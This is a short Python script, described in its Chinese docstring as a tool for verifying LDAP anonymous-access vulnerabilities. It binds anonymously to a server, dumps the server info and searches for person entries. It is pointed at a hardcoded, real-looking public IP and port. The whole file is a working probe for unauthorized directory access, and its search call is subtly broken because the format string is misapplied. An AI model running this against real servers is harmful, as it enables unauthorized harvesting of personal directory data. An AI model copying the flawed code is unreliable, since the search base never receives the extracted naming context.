import re
from ldap3 import Connection, Server, ALL

"""
    ldap匿名访问漏洞（未授权访问漏洞）验证工具
"""


def ldap_anonymous(ip):
    try:
        # 连接ldap
        server = Server(ip, get_info=ALL, connect_timeout=1)
        conn = Connection(server, auto_bind=True)
        print("[+] ldap login for anonymous")
        # 获取目标ldap服务器信息
        print("[+] ldap info")
        print(server.info)
        # 提取Naming contexts信息
        pattern = re.compile("Naming contexts:\s*(.*)\r")
        dc = pattern.findall(str(server.info))
        # print("dc  ", dc)
        # 查询数据
        print("[+] ldap search")
        conn.search("dc={}", "(objectclass=person)".format(dc))
        print(conn.entries)
        var = conn.closed
    except(Exception) as e:
        print("[-] error-> ", e)
        print('[-] checking for ldap anonymous fail')


if __name__ == "__main__":
    ldap_anonymous("121.201.107.57:7003")